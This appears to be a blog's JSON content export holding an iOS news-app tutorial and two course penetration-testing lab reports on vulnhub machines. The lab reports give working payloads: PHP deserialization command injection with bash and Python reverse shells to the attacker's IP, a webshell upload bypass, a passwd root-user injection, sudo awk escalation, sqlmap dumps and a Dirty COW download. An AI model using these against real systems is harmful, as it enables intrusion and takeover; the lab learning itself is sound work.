{"meta":{"title":"铃的杂货铺","subtitle":"二阶铃图","description":"喜欢夏天的无名之辈","author":"可弟WZ铃号机","url":"http://blog.kekwy.com","root":"/"},"pages":[{"title":"404 Not Found","date":"2022-07-30T02:45:25.000Z","updated":"2022-07-30T02:57:34.055Z","comments":true,"path":"404.html","permalink":"http://blog.kekwy.com/404.html","excerpt":"","text":"404"},{"title":"关于","date":"2022-07-31T13:41:20.153Z","updated":"2022-07-31T11:25:31.267Z","comments":false,"path":"about/index.html","permalink":"http://blog.kekwy.com/about/index.html","excerpt":"","text":"喜欢夏天的社畜程序猿，南京大学计算机系本科生，我的世界建筑玩家。 B站: 可弟WZ柒号机 知乎: 可弟岭冬 GitHub: Kekwy 近期计划： 文章：《从继承开始的Java应用笔记》 视频：《我的世界·水星生存指南》 项目：一个3D联机小游戏"},{"title":"留言板","date":"2022-07-31T13:03:54.437Z","updated":"2022-07-31T13:03:54.437Z","comments":true,"path":"comments/index.html","permalink":"http://blog.kekwy.com/comments/index.html","excerpt":"","text":"也可以是聊天室（"},{"title":"文章合集","date":"2022-07-31T13:04:10.582Z","updated":"2022-07-31T13:04:10.582Z","comments":true,"path":"categories/index.html","permalink":"http://blog.kekwy.com/categories/index.html","excerpt":"","text":""},{"title":"记录生活","date":"2022-07-31T11:26:11.263Z","updated":"2022-07-31T11:26:11.263Z","comments":false,"path":"recordings/index.html","permalink":"http://blog.kekwy.com/recordings/index.html","excerpt":"","text":"2022七月7.31 网站功能初步竣工，将在使用过程中调整或完善。"},{"title":"大伙儿","date":"2022-07-30T15:17:01.000Z","updated":"2022-07-31T13:04:48.714Z","comments":false,"path":"friends/index.html","permalink":"http://blog.kekwy.com/friends/index.html","excerpt":"","text":""}],"posts":[{"title":"【iOS开发】IW2 新闻APP","slug":"iw2-newsapp","date":"2022-11-28T10:02:55.000Z","updated":"2023-01-28T10:03:25.388Z","comments":true,"path":"iw2-newsapp/","link":"","permalink":"http://blog.kekwy.com/iw2-newsapp/","excerpt":"","text":"&#107;&#101;&#x65;&#x6b;&#107;&#x65;&#x77;&#121;&#x40;&#x71;&#113;&#x2e;&#x63;&#x6f;&#x6d; 简介 功能介绍 展示视频 技术实现 视图结构 内容目录页 目录内容抓取 目录内容显示 下拉和上拉刷新 界面跳转 文章详情页 内容加载 导航栏的隐藏和显示 关于我们页 感谢评阅 简介功能介绍该APP是为学校信息中心（ITSC）官网设计的一个新闻客户端，包含“新闻动态”、”通知公告“、”信息化动态“、“安全公告”、“关于我们”五个板块，实时从官网上抓取新闻，支持上拉刷新，下拉加载新内容，异步加载图片和对图片、文字进行本地缓存等功能。 展示视频 技术实现视图结构 内容目录页 每个板块使用 TableView 组织内容，没个 cell 展示一则新闻的标题和发布时间。用户点击 cell 时根据此时 cell中的内容跳转至对应新闻的详情页。 目录内容抓取初始化 url 在目录页的 TableViewController 初始化时，根据该页面导航栏的标题设置该页面板块所对应的 url 前缀。 1234567891011121314151617181920required init?(coder: NSCoder) &#123; url = &quot;&quot; receivedData = Data() super.init(coder: coder) switch(navigationItem.title) &#123; case &quot;新闻动态&quot;: url = &quot;https://itsc.nju.edu.cn/xwdt/list&quot; break case &quot;通知公告&quot;: url = &quot;https://itsc.nju.edu.cn/tzgg/list&quot; break case &quot;信息化动态&quot;: url = &quot;https://itsc.nju.edu.cn/wlyxqk/list&quot; break case &quot;安全公告&quot;: url = &quot;https://itsc.nju.edu.cn/aqtg/list&quot; break default: break &#125;&#125; 发送 url 请求 定义 session 用于发送和处理网络请求： 12345678private lazy var session: URLSession = &#123; let configuration = URLSessionConfiguration.default configuration.waitsForConnectivity = true configuration.timeoutIntervalForResource = 300 // 将缓存策略设置为从不使用缓存 configuration.requestCachePolicy = .reloadIgnoringLocalCacheData return URLSession(configuration: configuration, delegate: self, delegateQueue: nil)&#125;() 由于每次启动 APP 时应获取实时的新闻列表，故此处将 session 设置为不使用缓存。 将 url 前缀后直接加上 “.htm” 组成 itsc 对应板块文章列表第一页的 url 地址，在后台线程队列 requestQueue 中发起 urlRequest： 123456requestQueue.async &#123; let curUrl = URL(string: self.url + &quot;.htm&quot;) let task = self.session.dataTask(with: URLRequest(url: curUrl!)) self.refreshTaskId = task.taskIdentifier task.resume()&#125; 处理返回结果 在定义 session 时将当前 ViewController 设置为了其代理，故在当前 ViewController 中实现代理方法，并定义 receivedData 变量储存返回内容直到回复内容全部返回： 12345678910111213var receivedData: Datafunc urlSession(_ session: URLSession, dataTask: URLSessionDataTask, didReceive response: URLResponse, completionHandler: @escaping (URLSession.ResponseDisposition) -&gt; Void) &#123; ...&#125; func urlSession(_ session: URLSession, dataTask: URLSessionDataTask, didReceive data: Data) &#123; self.receivedData.append(data)&#125; func urlSession(_ session: URLSession, task: URLSessionTask, didCompleteWithError error: Error?) &#123; ...&#125; 使用 scanner 根据 itsc 官网源码的格式对得到的 html 代码进行解析，从中获取每条新闻的标题、日期、正文 url以及建立三者的对应关系。 1234let string = String(data: self.receivedData, encoding: .utf8)let contentScanner = Scanner(string: string!)_ = contentScanner.scanUpToString(&quot;&lt;div id=\\&quot;wp_news_w6\\&quot;&gt;&quot;)... 目录内容显示自定义 TableViewCell 自定义 ArticleTableViewCell 类，并在 TableViewController 中注册： 1self.tableView.register(ArticleTableViewCell.self, forCellReuseIdentifier: &quot;myCell&quot;) ArticleTableViewCell 中包含两个 UILabel，一个用于显示文章标题，另一个用于显示文章日期，还有一个字符串变量保存该文章的正文 url。 其中的所有控件在初始化时通过代码设置约束，每一个 cell 在加载标题前拥有默认高度，成功设置文章标题后其高度跟随标题 UILabel。 设置 cell 内容 在 TableViewController 中实现代理方法： 12345678override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -&gt; UITableViewCell &#123; let cell = tableView.dequeueReusableCell(withIdentifier: &quot;myCell&quot;, for: indexPath) if indexPath.row &lt; self.cellData.count &#123; let text = cellData[indexPath.row] (cell as! ArticleTableViewCell).setContent(link: text[0], title: text[1], date: text[2]) &#125; return cell&#125; 使用此前注册的信息创建一个 cell，根据即将显示的 cell 所在的行号获取对应的数据，并对其内容进行设置。 在 TableViewController 定义变量 cellData： 1private var cellData: [[String]] = [] 其为一个字符串的二维数组，每一行对应 tableView 中相同行数的 cell 的数据，每一列分别对应：正文 url、文章标题、文章日期。 下拉和上拉刷新 使用了 Github 上开源的包：MJRefresh 创建变量 header、footer： 12private let header = MJRefreshNormalHeader() // 顶部刷新private let footer = MJRefreshAutoNormalFooter() // 底部刷新 将其部署到视图中并设置事件响应方法： 12header.setRefreshingTarget(self, refreshingAction: #selector(pullRefresh))footer.setRefreshingTarget(self, refreshingAction: #selector(pullMore)) 在方法 pullRefresh 中将重复上文所述的请求目录第一页的操作，并将现有数据清空。 在方法 pullMore 中将请求下一页的目录信息，并将结果追加在现有数据之后，即实现用户下拉加载更多内容： 1234567891011requestQueue.async &#123; // 将当前页数加一 let pageNum: Int = self.pageNum + 1 // url 前缀 + 页号 + .htm 即为该板块对应页的 url let curUrl = URL(string: self.url + String(pageNum) + &quot;.htm&quot;) let task = self.session.dataTask(with: URLRequest(url: curUrl!)) self.pullMoreTaskId = task.taskIdentifier task.resume() // 更新当前页号 self.pageNum = pageNum&#125; 界面跳转1234567891011// UITableViewDelegate 方法，处理列表项的选中事件override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) &#123; self.performSegue(withIdentifier: &quot;ShowDetailView&quot;, sender: self.tableView.cellForRow(at: indexPath))&#125;//在这个方法中给新页面传递参数override func prepare(for segue: UIStoryboardSegue, sender: Any?) &#123; if segue.identifier == &quot;ShowDetailView&quot;&#123; (segue.destination as! ArticleViewController).url = URL(string: &quot;https://itsc.nju.edu.cn&quot; + (sender as! ArticleTableViewCell).link) &#125;&#125; 文章详情页 使用 scrollView 展示文章内容 在 ScrollView 中放置一个空白的 View，其高度跟随自身 y 值最大的子控件的 maxY。加载文章正文时涉及的控件作为子控件加入该 View 即可。 内容加载使用缓存 定义 session： 12345678private lazy var session: URLSession = &#123; let configuration = URLSessionConfiguration.default configuration.waitsForConnectivity = true configuration.timeoutIntervalForResource = 300 // 优先使用缓存，在缓存中找不到再重新通过网络加载 configuration.requestCachePolicy = .returnCacheDataElseLoad return URLSession(configuration: configuration, delegate: self, delegateQueue: nil)&#125;() 与之前不同的是，对于已经发布的新闻文章我们可以在第一次加载时将其保存在本地，之后都从本地加载文章内容，直到用户清除缓存。 加入子控件 同样使用 scanner 对 html 代码进行解析，根据 itsc 文章正文 html 代码的特征解析出文章标题、正文、图像 url，再根据不同的内容类型生成相应的子控件并设置约束。 所有的子控件根据其对应内容在正文代码中的顺序从上到下依次排列，每次加入子控件时都需要根据上一个加入的控件设置其 topAnchor 的约束，并将“上一个加入的子控件”更新为当前加入的控件。 contentView 的高度约束根据最后一个加入的子控件的 bottomAnchor 设置。 异步加载 其中在加入图片时，还需要对每个图片进行一次 url 请求，如果在主线程中阻塞等待其结果，则会造成界面卡顿，故我们在这里使用异步加载思路。 在进行图像的 url 请求时，先在 imageView 中添加一个活动指示器，令其播放“转圈”的加载动画： 123456let indicator = UIActivityIndicatorView()imageView.addSubview(indicator)indicator.translatesAutoresizingMaskIntoConstraints = falseindicator.startAnimating()indicator.centerXAnchor.constraint(equalTo: imageView.centerXAnchor).isActive = trueindicator.centerYAnchor.constraint(equalTo: imageView.centerYAnchor).isActive = true 再通过 DispatchQueue 的异步执行发送 url 请求，和处理响应内容。 在成功接收到图像数据后，停止加载动画，并根据图片缩放后的高度更新 imageView 的高度约束。 12345678910// 停止加载动画indicator.stopAnimating()// 移除活动指示器indicator.removeFromSuperview()// 更新 imageView 的高度约束for constraint in imageView.constraints &#123; if constraint.firstAnchor == imageView.heightAnchor &#123; constraint.constant = image.size.height * ( self.contentView.frame.width - 32) / (image.size.width) &#125;&#125; 导航栏的隐藏和显示实现 scrollView 的代理方法： 1234567891011121314151617func scrollViewDidScroll(_ scrollView: UIScrollView) &#123; let pan = scrollView.panGestureRecognizer let velocity = pan.velocity(in: scrollView).y // 用户向下划屏幕时显示导航栏 if velocity &lt; -10 &#123; self.navigationController?.setNavigationBarHidden(true, animated: true) statusBarStyle = .darkContent setNeedsStatusBarAppearanceUpdate() // 用户向上划屏幕时隐藏导航栏 &#125; else if velocity &gt; 10 &#123; self.navigationController?.setNavigationBarHidden(false, animated: true) statusBarStyle = .lightContent setNeedsStatusBarAppearanceUpdate() &#125;&#125; 由于我们的 APP 导航栏的颜色为“南大紫”，导航栏存在时系统状态栏的颜色是白色，而正文背景是白色，故在导航栏隐藏后，应将系统状态栏颜色改为黑色并刷新。 关于我们页点击按钮清除缓存： 12345678@IBAction func showAlert(_ sender: Any) &#123; let alert = UIAlertController(title: &quot;清除缓存&quot;, message: &quot;清除缓存后相应的内容将会在设备联网时重新加载，这将消耗一定的流量。您确定要清除缓存吗？&quot;, preferredStyle: .alert) alert.addAction(UIAlertAction(title: &quot;确定&quot;, style: .default, handler: &#123;_ in URLCache.shared.removeAllCachedResponses() &#125;)) alert.addAction(UIAlertAction(title: &quot;取消&quot;, style: .default, handler: nil)) self.present(alert, animated: true, completion: nil)&#125; 【感谢评阅】","categories":[{"name":"iOS智能应用开发","slug":"iOS智能应用开发","permalink":"http://blog.kekwy.com/categories/iOS%E6%99%BA%E8%83%BD%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"iOS","slug":"iOS","permalink":"http://blog.kekwy.com/tags/iOS/"},{"name":"Xcode","slug":"Xcode","permalink":"http://blog.kekwy.com/tags/Xcode/"},{"name":"开发","slug":"开发","permalink":"http://blog.kekwy.com/tags/%E5%BC%80%E5%8F%91/"}],"author":"Ke_DiWZ"},{"title":"【渗透测试】第十周 vulnhub-Cereal:1","slug":"vulnhub-Cereal","date":"2022-11-26T07:59:32.000Z","updated":"2022-11-26T08:07:41.195Z","comments":true,"path":"vulnhub-Cereal/","link":"","permalink":"http://blog.kekwy.com/vulnhub-Cereal/","excerpt":"","text":"网络攻防实战 第十次实验 邮箱：&#107;&#101;&#101;&#x6b;&#107;&#101;&#x77;&#x79;&#x40;&#x71;&#113;&#46;&#99;&#111;&#109; 2022年11月26日 靶机链接：https://vulnhub.com/entry/cereal-1,703/ 一、实验目的获取靶机 root 权限和一个 root flag。 我们将使用以下攻击手段： 主机发现、端口扫描； 隐藏路径爆破； 域名绑定 IP； 隐藏域名爆破； 隐藏文件爆破； 解析 PHP 对象序列并进行命令注入； 反弹 shell； 利用 pspy 工具查看靶机上运行的所有进程； 通过链接文件利用靶机漏洞； 自定义 root 用户； 二、实验内容 kali: 10.0.2.15 靶机: 10.0.2.17 0x00. 准备工作 获取靶机 IP 并扫描其开放的端口以及个端口上对应的服务： 12sudo arp-scan -I eth0 -lsudo nmap -p- 10.0.2.17 发现开启了许多端口，经过对各个端口进行简单尝试之后。考虑从 80 端口寻找突破口。 访问 80 端口发现是一个 Apache 的默认页面，查看源码也并没有直接可利用的信息： 尝试进行隐藏路径爆破： 1dirsearch -u http://10.0.2.17 访问 http://10.0.2.17/blog，发现了一个没有样式的页面，疑似与某一域名有关： 同时发现该网页是由 WordPress 支持的。 技巧：访问网页时出现卡顿，然后看到没有加载样式的网页，可推测是 CSS 加载失败，进而寻找是否需要将某一个域名的 IP 加入 hosts 文件中。 对 &#x2F;blog 路径进行进一步的路径爆破： 1dirsearch -u http://10.0.2.17/blog/ 发现目录 wp-admin，并且发现该目录被重定向到了我们刚才发现的那个域名。 尝试在 hosts 文件中加入记录 10.0.2.17 cereal.ctf 将该域名与靶机的 IP 地址对应。 123/etc/hosts:...10.0.2.17 cereal.ctf 重新访问 blog 页面，发现成功加载了样式： 在 80 端口的 web 应用继续进行信息收集，未发现明显的有效信息。 尝试从 4441 端口（同样运行着一个 web 应用）继续寻找突破口： 直接访问发现只有一行文本内容。 0x01. 服务器域名爆破 联想到某些服务器可能会根据 HTTP 请求中 HOST 头的不同，为用户返回不同的页面。尝试使用 gobuster 对靶机 44441 端口进行域名爆破： 1gobuster vhost -u http://cereal.ctf:44441 --append-domain -w fierce_hostlist.txt 字典文件在 kali 上的路径为：&#x2F;usr&#x2F;share&#x2F;amass&#x2F;wordlists&#x2F;fierce_hostlist.txt 成功扫描出一个域名：secure.cereal.ctf 将该域名与靶机 IP 关联并添加记录到 kali 的 host 文件中，浏览器访问 http://secure.cereal.ctf:44441/： 发现当前页面可以对指定的 IP 进行 ping 操作，输入 kali 本机的 IP，查看结果： 发现确实执行了 ping 操作，查看结果发现与系统命令中的 ping 操作返回结果格式相似，推测此处调用了系统指令，尝试进行命令注入。 0x02. 命令注入 尝试直接注入未果，使用 burp suite 拦截当前页面点击 ping 按钮之后的请求： 发现请求体比较可疑。 在 burp suite 中选中请求体中 obj 字段的值，进行解码： 得到了解码结果，猜测是一个经过 php 序列化编码之后的对象数据格式。在请求头中的数据已经进行了序列化，可以推测该编码操作是网页中的脚本代码负责完成的。 查看相关的网页源码： 123456789&lt;script&gt;function submit_form() &#123; var object = serialize(&#123;ipAddress: document.forms[&quot;ipform&quot;].ip.value&#125;); object = object.substr(object.indexOf(&quot;&#123;&quot;),object.length); object = &quot;O:8:\\&quot;pingTest\\&quot;:1:&quot; + object; document.forms[&quot;ipform&quot;].obj.value = object; document.getElementById(&#x27;ipform&#x27;).submit();&#125;&lt;/script&gt; 但是由于不知道服务器程序对该对象序列的处理流程，无法判断出直接有效的注入方式。联想到 blog 页面提示“尝试从备份中恢复”，猜测靶机上可能存在服务程序的备份文件，尝试通过隐藏文件爆破进行寻找。 “We are in the process of restoring from our backups” 0x03. 隐藏文件爆破 使用 kali 自带的 DirBuster 工具进行爆破： 最终发现路径：/back_en 继续对 &#x2F;back_en 下的文件进行爆破，由于是备份文件，猜测文件名后缀为 .bak： 发现备份文件 index.php.bak。 将查找到的备份文件下载到 kali： 1wget http://secure.cereal.ctf:44441/back_en/index.php.bak 查看内容猜测是 ping 页面的后台程序源码，并找到与 ping 功能相关的代码： 12345678910111213141516171819202122232425262728293031323334class pingTest &#123; public $ipAddress = &quot;127.0.0.1&quot;; public $isValid = False; public $output = &quot;&quot;; function validate() &#123; // 如果当前对象中的 isValid 值不为 True if (!$this-&gt;isValid) &#123; // 进行了某种过滤 if (filter_var($this-&gt;ipAddress, FILTER_VALIDATE_IP)) &#123; // 测试通过才会执行代码 $this-&gt;isValid = True; &#125; &#125; $this-&gt;ping(); &#125; public function ping() &#123; if ($this-&gt;isValid) &#123; // 指令的执行方式 $this-&gt;output = shell_exec(&quot;ping -c 3 $this-&gt;ipAddress&quot;); &#125; &#125;&#125;if (isset($_POST[&#x27;obj&#x27;])) &#123; $pingTest = unserialize(urldecode($_POST[&#x27;obj&#x27;]));&#125; else &#123; $pingTest = new pingTest;&#125;$pingTest-&gt;validate(); 通过对上述代码进行简单的分析，我们发现只需要我们上传的序列化对象中的 isValid 值本身为 True，就可以绕过服务端对 ipAddress 字段合法性的检测，最终导致靶机执行我们所注入的命令。 0x04. 继续命令注入 简单学习 PHP 对象序列的格式之后，对此前解码获得的对象序列进行分析： O : 8 : &quot;pingTest&quot; : 1 : &#123;s : 9 : &quot;ipAddress&quot;; s : 9 : &quot;127.0.0.1&quot;; &#125; o：object，表示对象类型； 8：表示其后的字符串长度为8； “pingTest”：表示当前对象为类 pingTest 的一个对象； 1：表示其后包含1个该对象的属性，花括号中的内容即为对象的属性； s：string，表示字符串类型； 9：其后的字符串长度； “ipAddress”：属性的名称； “127.0.0.1”：”ipAddress”属性的值； 参考：PHP序列化和反序列化 可见请求体中发送给服务器的对象仅包含了 ipAddress 这个一个属性，为了绕过服务端的检测，需要添加 isValid 属性且将其赋值为 True。构造对象序列如下： O:8:&quot;pingTest&quot;:2:&#123;s:9:&quot;ipAddress&quot;;s:9:&quot;127.0.0.1&quot;;s:7:&quot;isValid&quot;;b:1;&#125; 加入属性 s:7:&quot;isValid&quot;;b:1; 。 其中，分析服务端代码得知，我们可以将需要注入的命令包含在 ipAddress 的值中，最终修改序列如下： O:8:&quot;pingTest&quot;:2:&#123;s:9:&quot;ipAddress&quot;;s:14:&quot;127.0.0.1 &amp; id&quot;;s:7:&quot;isValid&quot;;b:1;&#125; 在 burp suite 中用上述注入序列替换原始的对象序列，编码后发送： 发现除了 ping 的结果，我们还收到了注入命令的执行结果： 尝试使用如下命令获取反弹 shell： 1bash -i &gt;&amp; /dev/tcp/10.0.2.15/4444 0&gt;&amp;1 构造注入序列： O:8:&quot;pingTest&quot;:2:&#123;s:9:&quot;ipAddress&quot;;s:40:&quot;&amp;bash -i &gt;&amp; /dev/tcp/10.0.2.15/4444 0&gt;&amp;1&quot;;s:7:&quot;isValid&quot;;b:1;&#125; 在 kali 上监听 4444 端口，执行注入命令，成功获取反弹 shell： 0x05. 本地漏洞提权 利用 pspy 工具检测靶机上正在运行的进程： 发现存在一个以 root 身份运行某个 shell 脚本的进程。 pspy 工具：https://github.com/DominicBreuker/pspy 查看该脚本内容; 1chown rocky:apache /home/rocky/public_html/* 发现是将 /home/rocky/public_html/* 目录下的所有文件所有者更改为当前用户，猜测若在该目录下创建一个 passwd 文件的链接文件，会导致脚本执行时将 passwd 文件的所有者一并更改为当前用户，从而获取对 passwd 文件的写入权限。 使用 ln 命令将 passwd 文件链接到该目录下： 1ln -s /etc/passwd /home/rocky/public_html/111111 等待片刻后查看 passwd 文件的权限： 1ls -l /etc/passwd -rwxrwxr-x. 1 root root 1549 May 29 2021 /etc/passwd 发现文件权限成功被修改。 再次使用 实验八 中自定义 root 用户的方式，插入一条 root 权限的用户记录： 1echo &#x27;test123:$1$5zwm/pYB$109Okt6Ql.GcBYi/z16xT1:0:0:root:/root:/bin/bash&#x27; &gt;&gt; /etc/passwd 切换至该自定义用户，成功提权： 0x06. 最终的信息收集 尝试使用 ssh 以自定义 root 用户身份登入靶机： 1ssh test123@10.0.2.17 成功登入后查看当前目录下的文件： 查看文件 proof.txt 得到 flag：1aeb5db4e979543cb807cfd90df77763 查看文件 listener.sh： 12345678910nc -k -l 139 &amp;nc -k -l 445 &amp;nc -k -l 11111 &amp;nc -k -l 22222 &amp;nc -k -l 22223 &amp;nc -k -l 33333 &amp;nc -k -l 33334 &amp;nc -k -l 44444 &amp;nc -k -l 55555 &amp;nc -k -l 55551 发现是一段 shell 脚本，通过 nc 命令监听了很多端口。 推测这就是我们之前 nmap 扫描出来很多端口，但是无法确定其上所运行服务的原因——这些端口仅被监听，实际上并没有运行有效的服务。 五、实验结果root 权限： 任务一：点击跳转； 任务二：点击跳转； 任务三：点击跳转。 四、总结 本次实验靶机开发的端口很多，需要从扫描到的端口中寻找突破口。首先关注提供 web 应用的端口。 浏览器访问 80 端口，未发现有效信息，进行路径爆破发现 /blog 路径，访问路径发现一个未加载样式的网页，并获得提示——靶机上存在某个服务端的备份文件。 对 /blog 路径进行进一步爆破，发现某些路径被重定向到了某个域名的子路径上，尝试在 kali 的 hosts 文件中将该域名与靶机 IP 绑定。再次访问 /blog 路径，发现成功加载了样式。 浏览器访问靶机 44441 端口，发现没有有效信息。对该端口进行域名爆破，发现一个隐藏的域名，同样将该域名与靶机 IP 进行绑定。再次访问后，发现当前页面可以对用户输入的 IP 地址进行 ping 操作。联想到命令注入。 简单尝试注入后未果，拦截 ping 操作时发往服务器的请求头。发现网页将用户输入的 IP 地址包装成了一个对象，并做了序列化操作。但由于不知道服务端解析对象的方式，故无法直接进行命令注入。 联想到 80 端口 /blog 路径下的提示，尝试通过路径、文件爆破寻找靶机上的备份文件。 找到备份文件后，下载至 kali 查看，推测是 ping 操作页面服务端的源码。根据该源码中的对象解析方式，构造注入对象的序列，实现合法性绕过以及命令的注入，最终成功获取反弹 shell。 使用 pspy 工具查看靶机上运行的进程，找到一个以 root 身份运行的 shell 脚本进程。查看相关脚本，发现该脚本将指定目录下的所有文件的所有者更改为了反弹 shell 中的当前用户。 尝试在该目录下建立 passwd 文件的链接，使该脚本更改 passwd 文件的所有者，最终获取对 passwd 文件的写入权限。 使用与实验八相同的操作自定义一条 root 用户记录，并插入 passwd 文件。 切换至自定义用户，完成提权！ ps：实验报告中只展示了成功的思路，但是在实际的渗透测试中，往往需要我们对多个漏洞点进行尝试，才能找到有效的突破口。","categories":[{"name":"网络攻防实战","slug":"网络攻防实战","permalink":"http://blog.kekwy.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/"}],"tags":[{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"Kali","slug":"Kali","permalink":"http://blog.kekwy.com/tags/Kali/"},{"name":"网络","slug":"网络","permalink":"http://blog.kekwy.com/tags/%E7%BD%91%E7%BB%9C/"},{"name":"安全","slug":"安全","permalink":"http://blog.kekwy.com/tags/%E5%AE%89%E5%85%A8/"},{"name":"Linux","slug":"Linux","permalink":"http://blog.kekwy.com/tags/Linux/"},{"name":"vulnhub","slug":"vulnhub","permalink":"http://blog.kekwy.com/tags/vulnhub/"}],"author":"Ke_DiWZ"},{"title":"【渗透测试】第九周 vulnhub-DoubleTrouble:1","slug":"vulnhub-doubletrouble","date":"2022-11-15T16:46:45.000Z","updated":"2022-11-26T07:58:34.612Z","comments":true,"path":"vulnhub-doubletrouble/","link":"","permalink":"http://blog.kekwy.com/vulnhub-doubletrouble/","excerpt":"","text":"网络攻防实战 第九次实验 邮箱：&#107;&#101;&#101;&#x6b;&#x6b;&#101;&#x77;&#x79;&#64;&#x71;&#113;&#x2e;&#99;&#111;&#x6d; 靶机链接：https://www.vulnhub.com/entry/doubletrouble-1,743/ 2022年11月15日 一、实验目的本次的靶机比较特别，在获取第一个靶机的 root 权限后会在 root 主目录下发下另一个靶机的 .ova 文件，我们还需要将其下载到宿主机，继续尝试渗透。最终取得两个靶机的 root 权限以及第二个靶机上的两个 flag。 我们将使用到以下攻击手段： 主机发现； 端口扫描； 隐藏路径爆破； 隐写数据破解； 文件上传漏洞； 一句话木马脚本； 反弹 shell； awk 提权； sql基于时间的盲注（使用sqlmap）； 脏牛漏洞提权。 二、实验内容 kali: 10.0.2.15 靶机: 10.0.2.14、10.0.2.16 0x00. 准备工作 获取靶机 IP 并扫描其开放的端口以及个端口上对应的服务： 12sudo arp-scan -I eth0 -lsudo nmap -p- 10.0.2.14 -A 访问80端口发现是一个登录界面，查看源码也并没有直接可利用的信息： 尝试直接输入单引号触发报错寻找注入点，也没有结果。 （使用 BurpSuite 拦截请求，发现我们输入的单引号在发送前被进行了转义，但重新修改为单引号后发送，同样没有收到报错信息） 0x01. 隐藏路径爆破 首先想到查找隐藏路径： 1dirsearch -u http://10.0.2.14 找到了隐藏路径 /secret/ ，根据此前实验的经验，我们第一时间查看其内容。 访问上述目录，发现只包含一张图片： 既然其处于 /secret/ 目录下，猜测其中包含隐写入的信息。 将其保存至 kali，使用 stegseek 工具进行破解： 安装：$ sudo apt install stegseek 仓库：https://github.com/RickdeJager/stegseek 1stegseek doubletrouble.jpg rockyou.txt 其中 rockyou.txt 字典可以通过 locate 命令在 kali 上找到。 生成了输出文件 doubletrouble.jpg.out，查看破解结果，发现疑似此前网站主页的登录邮箱和密码。 12otisrush@localhost.comotis666 尝试登录，成功跳转至下级界面： 0x02. 文件上传漏洞 浏览各个界面，优先关注文件上传点： 首先发现可以通过网页右上角进入用户的 My Details 界面，其中可以进行用户的头像的上传，但是先尝试上传一个普通图片后，发现该功能存在 bug，上传失败。 返回主页后在左侧菜单栏访问目录 Tools-&gt;Import Tasks from XLS file ，发现第二个文件上传点，但是上传之后，同样触发错误： 最终在左侧菜单栏 Configuration-&gt;General-&gt;General 界面发现有效的文件上传点。 浏览 Configuration-&gt;General-&gt;General 界面，发现可以进行文件上传，推测可能是用于设置该网站应用的 logo： 选择任意图片尝试上传后，发现当前页面左上角发生变化，变为了我们刚才选择的图片： 说明此处的文件上传功能确实有效可用。 尝试直接上传我们祖传的一句话木马文件，发现上传失败，推测需要进行文件类型检测的绕过。 在此尝试上传，并使用 BurpSuite 截获我们的请求，修改我们所上传文件的信息： 使用此前实验中用过的方法，在文件内容开头加入 GIF89a 进行文件内容欺诈。 发现左上角的内容发生变化，变为一张显示错误的图片。右键选择新建标签页打开图片，获取图片对应文件的 url： 显然我们的一句话木马文件上传成功，测试一下： 到此为止，我们就可以和之前一样，通过一句话木马执行反弹 shell 脚本： 12http://10.0.2.14/uploads/script.php?cmd=python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.2.15&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27; 成功获取反弹 shell，使用以下指令进行提升： 1python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot; 0x03. 利用 awk 提权 查看当前用户不使用密码就可以通过 sudo 执行的命令： 1sudo -l 发现可以不使用密码通过 sudo 执行 awk 命令。 前往提权指令汇总网站 GTFOBins 查找 awk 命令： 选择 Shell 查看 Shell 提权的命令： 1sudo awk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27; 在反弹 shell 中输入上述指令，完成提权。 切换至靶机的 root 用户主目录，发现还存在一个靶机的 .ova 文件： 使用 nc 命令将其下载到 kali，再通过 virtualBox 的文件传输功能将其传送至宿主机。 12nc -n 10.0.2.15 1234 &lt; doubletrouble.ova # 靶机nc -lp 1234 &gt; doubletrouble.ova # kali 或在靶机上开启 web 应用，然后在上对目标文件进行下载【本次使用】 0x04. SQL 盲注 对该靶机进行同样的主机发现以及端口扫描等常规操作之后，发现开放了 80 端口，浏览器访问，发现又是一个登录界面： 常规的 SQL 注入探测未发现注入点，考虑 SQL 盲注。 截获我们在该界面进行登录时的请求： 修改如下： 根据 SQL 语法，我们可以判定，如果该报文的响应在发送十秒之后到来。则说明此处存在注入点。考虑通过 sqlmap 实现盲注的自动化，并导出靶机数据库。 将该请求数据包的内容拷贝至本地的文件 sqlinject 中： 使用 sqlmap 从该文件中加载请求，并进行探测： 1sqlmap -r sqlinject -p uname,psw # 指定测试参数为uname, psw sqlmap 会自动尝试各种注入方式，根据输入结果可知 sqlmap 成功通过基于时间的盲注获取靶机数据库的信息： 查看当前用户可见的数据库： 1sqlmap -r sqlinject -p uname,psw --dbs 由于是基于时间的盲注，观察结果的输出过程可以发现，每隔一段时间确认一个字符。 查看数据库 doubletrouble 中的表： 1sqlmap -r sqlinject -p uname,psw -D doubletrouble --tables 查看表 users 的列： 1sqlmap -r sqlinject -p uname,psw -D doubletrouble -T users --columns 查看表中 username 与 password 两项的内容： 1sqlmap -r sqlinject -p uname,psw -D doubletrouble -T users -C username,password --dump 发现存在两个用户。 将其输入之前的登录界面，发现两个用户都无法登录。想到靶机开放了22端口，尝试使用上述两个用户的信息通过 SSH 登入靶机。发现用户 clapton 登入成功： 0x05. “脏牛”漏洞提权 脏牛漏洞：又叫Dirty COW（copy-on-write），存在Linux内核中已经有长达9年的时间，在2007年发布的Linux内核版本中就已经存在此漏洞。Linux kernel团队在2016年10月18日已经对此进行了修复。 漏洞范围：Linux内核 &gt;&#x3D; 2.6.22（2007年发行，到2016年10月18日才修复） 发现当前目录有存在文件 user.txt，查看内容，获取第一个 Flag： Flag1: 6CEA7A737C7C651F6DA7669109B5FB52 查看内核版本 uname -a： 发现该版本存在脏牛漏洞。 搜索其利用代码： 仓库：https://github.com/gbonacini/CVE-2016-5195 在 kali 创建 dcow.cpp 写入漏洞利用代码，并通过 web 服务将其上传至靶机： 12sudo python3 -m http.server 80 # kaliwget http://10.0.2.15/dcow.cpp # 靶机 查看仓库中的 makefile 